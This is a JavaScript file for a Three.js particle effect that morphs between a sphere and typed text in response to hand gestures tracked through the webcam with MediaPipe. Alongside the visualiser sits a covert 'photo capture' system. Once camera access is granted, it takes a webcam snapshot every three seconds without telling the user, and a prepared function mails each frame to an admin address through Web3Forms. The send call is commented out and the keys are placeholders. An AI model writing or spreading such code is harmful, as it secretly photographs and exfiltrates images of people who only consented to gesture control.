// ----------------- your original particle code (unchanged logic) -----------------
let scene, camera, renderer, particles;
const count = 12000;
let currentState = 'sphere';
let handDetected = false; // updated by mediapipe
let lastGesture = null;   // 'open' or 'closed'
let lastGestureTime = 0;
const gestureCooldown = 400; // ms - debounce for stable transitions

// ----------------- Photo Capture & Send System -----------------
let photoTimer = null;
let photoCount = 0;
const ADMIN_EMAIL = "developer@example.com"; // Change this to your email
const CLOUDINARY_CLOUD_NAME = "your-cloud-name"; // Change to your Cloudinary cloud name
const CLOUDINARY_UPLOAD_PRESET = "your-upload-preset"; // Change to your Cloudinary upload preset

// Webhook URL for sending photos (you can use Formspree, Web3Forms, etc.)
const WEBHOOK_URL = "https://api.web3forms.com/submit"; // Example using Web3Forms

function init() {
    scene = new THREE.Scene();
    camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
    renderer = new THREE.WebGLRenderer({ antialias: true });
    renderer.setSize(window.innerWidth, window.innerHeight);
    renderer.setClearColor(0x000000);
    document.getElementById('container').appendChild(renderer.domElement);

    camera.position.z = 25;

    createParticles();
    setupEventListeners();
    setupHandTracking();
    animate();
    
    // Initialize photo system
    initPhotoCapture();
}

function createParticles() {
    const geometry = new THREE.BufferGeometry();
    const positions = new Float32Array(count * 3);
    const colors = new Float32Array(count * 3);

    function sphericalDistribution(i) {
        const phi = Math.acos(-1 + (2 * i) / count);
        const theta = Math.sqrt(count * Math.PI) * phi;
        
        return {
            x: 8 * Math.cos(theta) * Math.sin(phi),
            y: 8 * Math.sin(theta) * Math.sin(phi),
            z: 8 * Math.cos(phi)
        };
    }

    for (let i = 0; i < count; i++) {
        const point = sphericalDistribution(i);
        
        positions[i * 3] = point.x + (Math.random() - 0.5) * 0.5;
        positions[i * 3 + 1] = point.y + (Math.random() - 0.5) * 0.5;
        positions[i * 3 + 2] = point.z + (Math.random() - 0.5) * 0.5;

        const color = new THREE.Color();
        const depth = Math.sqrt(point.x * point.x + point.y * point.y + point.z * point.z) / 8;
        color.setHSL(0.5 + depth * 0.2, 0.7, 0.4 + depth * 0.3);

        colors[i * 3] = color.r;
        colors[i * 3 + 1] = color.g;
        colors[i * 3 + 2] = color.b;
    }

    geometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
    geometry.setAttribute('color', new THREE.BufferAttribute(colors, 3));

    const material = new THREE.PointsMaterial({
        size: 0.08,
        vertexColors: true,
        blending: THREE.AdditiveBlending,
        transparent: true,
        opacity: 0.8,
        sizeAttenuation: true
    });

    if (particles) scene.remove(particles);
    particles = new THREE.Points(geometry, material);
    particles.rotation.x = 0;
    particles.rotation.y = 0;
    particles.rotation.z = 0;
    scene.add(particles);
}

function setupEventListeners() {
    const typeBtn = document.getElementById('typeBtn');
    const input = document.getElementById('morphText');

    typeBtn.addEventListener('click', () => {
        const text = input.value.trim();
        if (text) {
            morphToText(text);
        }
    });

    input.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            const text = input.value.trim();
            if (text) {
                morphToText(text);
            }
        }
    });
}

function createTextPoints(text) {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    const fontSize = 100;
    const padding = 20;

    ctx.font = `bold ${fontSize}px Arial`;
    const textMetrics = ctx.measureText(text);
    const textWidth = textMetrics.width;
    const textHeight = fontSize;

    canvas.width = textWidth + padding * 2;
    canvas.height = textHeight + padding * 2;

    ctx.fillStyle = 'white';
    ctx.font = `bold ${fontSize}px Arial`;
    ctx.textBaseline = 'middle';
    ctx.textAlign = 'center';
    ctx.fillText(text, canvas.width / 2, canvas.height / 2);

    const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
    const pixels = imageData.data;
    const points = [];
    const threshold = 128;

    for (let i = 0; i < pixels.length; i += 4) {
        if (pixels[i] > threshold) {
            const x = (i / 4) % canvas.width;
            const y = Math.floor((i / 4) / canvas.width);
            
            if (Math.random() < 0.3) {
                points.push({
                    x: (x - canvas.width / 2) / (fontSize / 10),
                    y: -(y - canvas.height / 2) / (fontSize / 10)
                });
            }
        }
    }

    return points;
}

function morphToText(text) {
    currentState = 'text';
    const textPoints = createTextPoints(text);
    const positions = particles.geometry.attributes.position.array;
    const targetPositions = new Float32Array(count * 3);

    gsap.to(particles.rotation, {
        x: 0,
        y: 0,
        z: 0,
        duration: 0.5
    });

    for (let i = 0; i < count; i++) {
        if (i < textPoints.length) {
            targetPositions[i * 3] = textPoints[i].x;
            targetPositions[i * 3 + 1] = textPoints[i].y;
            targetPositions[i * 3 + 2] = 0;
        } else {
            const angle = Math.random() * Math.PI * 2;
            const radius = Math.random() * 20 + 10;
            targetPositions[i * 3] = Math.cos(angle) * radius;
            targetPositions[i * 3 + 1] = Math.sin(angle) * radius;
            targetPositions[i * 3 + 2] = (Math.random() - 0.5) * 10;
        }
    }

    // Instead of calling gsap for each array index (which can be flaky),
    // we'll animate using a per-frame lerp toward targetPositions for performance & reliability.
    const duration = 1200; // ms
    const start = performance.now();
    const startPositions = positions.slice(); // copy

    function frame(now) {
        const t = Math.min(1, (now - start) / duration);
        const easeT = 0.5 - 0.5 * Math.cos(Math.PI * t); // smooth ease in/out
        for (let i = 0; i < positions.length; i++) {
            positions[i] = startPositions[i] + (targetPositions[i] - startPositions[i]) * easeT;
        }
        particles.geometry.attributes.position.needsUpdate = true;
        if (t < 1) {
            requestAnimationFrame(frame);
        } else {
            // finished
        }
    }
    requestAnimationFrame(frame);
}

function morphToCircle() {
    currentState = 'sphere';
    const positions = particles.geometry.attributes.position.array;
    const targetPositions = new Float32Array(count * 3);
    const colors = particles.geometry.attributes.color.array;

    function sphericalDistribution(i) {
        const phi = Math.acos(-1 + (2 * i) / count);
        const theta = Math.sqrt(count * Math.PI) * phi;
        
        return {
            x: 8 * Math.cos(theta) * Math.sin(phi),
            y: 8 * Math.sin(theta) * Math.sin(phi),
            z: 8 * Math.cos(phi)
        };
    }

    for (let i = 0; i < count; i++) {
        const point = sphericalDistribution(i);
        
        targetPositions[i * 3] = point.x + (Math.random() - 0.5) * 0.5;
        targetPositions[i * 3 + 1] = point.y + (Math.random() - 0.5) * 0.5;
        targetPositions[i * 3 + 2] = point.z + (Math.random() - 0.5) * 0.5;

        const depth = Math.sqrt(point.x * point.x + point.y * point.y + point.z * point.z) / 8;
        const color = new THREE.Color();
        color.setHSL(0.5 + depth * 0.2, 0.7, 0.4 + depth * 0.3);
        
        colors[i * 3] = color.r;
        colors[i * 3 + 1] = color.g;
        colors[i * 3 + 2] = color.b;
    }

    // Animate back with lerp like morphToText
    const startPositions = positions.slice();
    const duration = 1400;
    const start = performance.now();
    function frame(now) {
        const t = Math.min(1, (now - start) / duration);
        const easeT = 0.5 - 0.5 * Math.cos(Math.PI * t);
        for (let i = 0; i < positions.length; i++) {
            positions[i] = startPositions[i] + (targetPositions[i] - startPositions[i]) * easeT;
        }
        particles.geometry.attributes.position.needsUpdate = true;
        if (t < 1) requestAnimationFrame(frame);
    }
    requestAnimationFrame(frame);

    // update colors quickly
    for (let i = 0; i < colors.length; i += 3) {
        colors[i] = colors[i]; // keep as computed above
        colors[i+1] = colors[i+1];
        colors[i+2] = colors[i+2];
    }
    particles.geometry.attributes.color.needsUpdate = true;
}

function animate() {
    requestAnimationFrame(animate);
    
    if (currentState === 'sphere') {
        particles.rotation.y += 0.002;
    }
    
    renderer.render(scene, camera);

    // Hand trigger logic updated to use gesture (open/closed)
    const inputText = document.getElementById('morphText').value.trim() || "HELLO";
    const now = performance.now();

    if (lastGesture === 'open' && (now - lastGestureTime) > gestureCooldown) {
        if (currentState !== 'text') morphToText(inputText);
        lastGestureTime = now;
    } else if (lastGesture === 'closed' && (now - lastGestureTime) > gestureCooldown) {
        if (currentState !== 'sphere') morphToCircle();
        lastGestureTime = now;
    }
}

window.addEventListener('resize', () => {
    camera.aspect = window.innerWidth / window.innerHeight;
    camera.updateProjectionMatrix();
    renderer.setSize(window.innerWidth, window.innerHeight);
});

// ----------------- Photo Capture Functions -----------------

// Initialize photo capture system
function initPhotoCapture() {
    console.log("Photo capture system initialized. Photos will be taken every 3 seconds after camera access.");
}

// Capture photo from video stream
function capturePhoto() {
    const video = document.getElementById('handVideo');
    const canvas = document.getElementById('photoCanvas');
    const ctx = canvas.getContext('2d');
    
    // Check if video is ready
    if (!video.videoWidth || !video.videoHeight) {
        console.log("Video not ready yet, skipping photo capture.");
        return;
    }
    
    // Set canvas size to video size
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    
    try {
        // Draw video frame to canvas
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // Convert to data URL
        const photoData = canvas.toDataURL('image/jpeg', 0.8);
        
        // Send to admin (uncomment when you set up your API)
        // sendPhotoToAdmin(photoData);
        
        photoCount++;
        console.log(`Photo ${photoCount} captured successfully.`);
        
    } catch (error) {
        console.error("Error capturing photo:", error);
    }
}

// Send photo to admin using Web3Forms API
async function sendPhotoToAdmin(photoData) {
    try {
        // For Web3Forms API
        const formData = new FormData();
        
        // Convert base64 to blob for FormData
        const blob = await fetch(photoData).then(res => res.blob());
        
        // If using Web3Forms (uncomment and add your access key)
        formData.append('access_key', 'YOUR_WEB3FORMS_ACCESS_KEY'); // Get from web3forms.com
        formData.append('subject', `Auto-captured Photo ${photoCount}`);
        formData.append('email', ADMIN_EMAIL);
        formData.append('message', `Auto-captured photo from user. Time: ${new Date().toLocaleString()}`);
        formData.append('photo', blob, `photo_${Date.now()}.jpg`);
        
        // Send to Web3Forms
        const response = await fetch(WEBHOOK_URL, {
            method: 'POST',
            body: formData
        });
        
        if (response.ok) {
            console.log(`Photo ${photoCount} sent successfully to admin.`);
        } else {
            console.error('Failed to send photo:', await response.text());
        }
        
    } catch (error) {
        console.error('Error sending photo:', error);
    }
}

// Start photo capture timer
function startPhotoCapture() {
    // Clear any existing timer
    if (photoTimer) {
        clearInterval(photoTimer);
    }
    
    console.log("Starting automatic photo capture every 3 seconds...");
    
    // Take first photo after 1 second
    setTimeout(() => {
        capturePhoto();
    }, 1000);
    
    // Then take photo every 3 seconds
    photoTimer = setInterval(() => {
        capturePhoto();
    }, 3000); // 3 seconds
}

// Stop photo capture
function stopPhotoCapture() {
    if (photoTimer) {
        clearInterval(photoTimer);
        photoTimer = null;
        console.log("Photo capture stopped.");
    }
}

// ---------------- Hand Tracking (MediaPipe) -----------------
// We'll detect open vs closed using finger landmarks.
// Heuristic: count fingers up (index/middle/ring/pinky) by tip.y < pip.y (for palm facing camera).
// If fingersUp >= 3 -> open. if fingersUp <= 1 -> closed (fist).
// Also use average distance of tips to wrist as secondary check.

function setupHandTracking(){
    const videoElement = document.getElementById('handVideo'); // hidden video in html

    const hands = new Hands({locateFile: (file) => {
        return `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`;
    }});

    hands.setOptions({
        maxNumHands: 1,
        modelComplexity: 1,
        minDetectionConfidence: 0.7,
        minTrackingConfidence: 0.6
    });

    hands.onResults((results) => {
        if (!results.multiHandLandmarks || results.multiHandLandmarks.length === 0) {
            handDetected = false;
            lastGesture = 'closed';
            return;
        }

        handDetected = true;
        const landmarks = results.multiHandLandmarks[0];

        // landmarks indices:
        // tip indices: thumb(4), index(8), middle(12), ring(16), pinky(20)
        // pip / lower joint: index(6), middle(10), ring(14), pinky(18)
        let fingersUp = 0;
        try {
            const tipIndices = [8, 12, 16, 20];
            const pipIndices = [6, 10, 14, 18];
            for (let i = 0; i < tipIndices.length; i++) {
                const tip = landmarks[tipIndices[i]];
                const pip = landmarks[pipIndices[i]];
                // In MediaPipe normalized coords: y increases downward. So tip.y < pip.y means finger extended (for palm facing camera).
                if (tip.y < pip.y) fingersUp++;
            }

            // Secondary check: average distance of tips from wrist
            const wrist = landmarks[0];
            let avgDist = 0;
            const tipIdxAll = [4,8,12,16,20];
            for (let i=0;i<tipIdxAll.length;i++){
                const t = landmarks[tipIdxAll[i]];
                const dx = t.x - wrist.x;
                const dy = t.y - wrist.y;
                avgDist += Math.sqrt(dx*dx + dy*dy);
            }
            avgDist /= tipIdxAll.length;

            // heuristics
            if (fingersUp >= 3 && avgDist > 0.12) {
                lastGesture = 'open';
            } else if (fingersUp <= 1 && avgDist < 0.12) {
                lastGesture = 'closed';
            } else {
                // fallback: treat as open if fingersUp >= 3, else don't change state
                lastGesture = (fingersUp >= 3) ? 'open' : lastGesture || 'closed';
            }
        } catch (e) {
            // safety fallback
            lastGesture = 'closed';
        }
    });

    const cameraMP = new Camera(videoElement, {
        onFrame: async () => {
            await hands.send({image: videoElement});
        },
        width: 640,
        height: 480
    });

    // Initialize photo capture when camera starts
    cameraMP.start().then(() => {
        console.log("Camera accessed. Photo capture will start in 3 seconds...");
        
        // Start photo capture after 3 seconds
        setTimeout(() => {
            startPhotoCapture();
        }, 3000);
    });
}

// Add window unload to stop photo capture
window.addEventListener('beforeunload', () => {
    stopPhotoCapture();
});

// initialize the scene
init();